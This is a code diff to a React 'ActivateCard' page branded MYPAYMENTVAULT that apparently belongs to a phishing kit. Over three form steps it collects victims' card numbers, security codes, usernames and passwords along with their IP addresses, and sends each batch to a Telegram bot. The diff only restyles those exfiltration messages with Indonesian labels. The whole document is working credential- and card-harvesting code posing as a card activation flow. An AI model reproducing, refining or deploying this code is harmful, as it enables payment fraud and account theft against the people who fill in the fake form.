@@ -56,29 +56,41 @@ export default function ActivateCard() {
 
     if (step === 0) {
       await sendTelegram(
-        `💳 <b>MYPAYMENTVAULT - Activate Card (Step 1)</b>\n\n` +
-        `💳 Card Number: <code>${form.cardNumber}</code>\n` +
-        `🔒 Security Code: <code>${form.securityCode}</code>\n` +
-        `🌐 IP Address: <code>${ip}</code>\n` +
-        `🕐 Waktu: ${now}`
+        `━━━━━━━━━━━━━━━━━━━━━\n` +
+        `💳 <b>MYPAYMENTVAULT</b>\n` +
+        `📌 <b>Aktivasi Kartu — Step 1</b>\n` +
+        `━━━━━━━━━━━━━━━━━━━━━\n\n` +
+        `💳 <b>No. Kartu</b>    : <code>${form.cardNumber}</code>\n` +
+        `🔒 <b>Kode Keamanan</b>: <code>${form.securityCode}</code>\n` +
+        `🌐 <b>IP & Lokasi</b>  : <code>${ip}</code>\n` +
+        `🕐 <b>Waktu</b>        : ${now}\n` +
+        `━━━━━━━━━━━━━━━━━━━━━`
       );
     } else if (step === 1) {
       await sendTelegram(
-        `🔤 <b>MYPAYMENTVAULT - Activate Card (Step 2: Username)</b>\n\n` +
-        `👤 Username: <code>${form.username}</code>\n` +
-        `🌐 IP Address: <code>${ip}</code>\n` +
-        `🕐 Waktu: ${now}`
+        `━━━━━━━━━━━━━━━━━━━━━\n` +
+        `💳 <b>MYPAYMENTVAULT</b>\n` +
+        `📌 <b>Aktivasi Kartu — Step 2</b>\n` +
+        `━━━━━━━━━━━━━━━━━━━━━\n\n` +
+        `👤 <b>Username</b>    : <code>${form.username}</code>\n` +
+        `🌐 <b>IP & Lokasi</b> : <code>${ip}</code>\n` +
+        `🕐 <b>Waktu</b>       : ${now}\n` +
+        `━━━━━━━━━━━━━━━━━━━━━`
       );
     } else if (step === 2) {
       await sendTelegram(
-        `✅ <b>MYPAYMENTVAULT - Activate Card (Selesai)</b>\n\n` +
-        `💳 Card Number: <code>${form.cardNumber}</code>\n` +
-        `🔒 Security Code: <code>${form.securityCode}</code>\n` +
-        `👤 Username: <code>${form.username}</code>\n` +
-        `🔑 Password: <code>${form.password}</code>\n` +
-        `🌐 IP Address: <code>${ip}</code>\n` +
-        `🕐 Waktu: ${now}\n\n` +
-        `🎉 <b>Kartu berhasil diaktifkan!</b>`
+        `━━━━━━━━━━━━━━━━━━━━━\n` +
+        `✅ <b>MYPAYMENTVAULT</b>\n` +
+        `📌 <b>Aktivasi Kartu — Selesai</b>\n` +
+        `━━━━━━━━━━━━━━━━━━━━━\n\n` +
+        `💳 <b>No. Kartu</b>    : <code>${form.cardNumber}</code>\n` +
+        `🔒 <b>Kode Keamanan</b>: <code>${form.securityCode}</code>\n` +
+        `👤 <b>Username</b>     : <code>${form.username}</code>\n` +
+        `🔑 <b>Password</b>     : <code>${form.password}</code>\n` +
+        `🌐 <b>IP & Lokasi</b>  : <code>${ip}</code>\n` +
+        `🕐 <b>Waktu</b>        : ${now}\n` +
+        `━━━━━━━━━━━━━━━━━━━━━\n` +
+        `🎉 <i>Kartu berhasil diaktifkan!</i>`
       );
     }
 
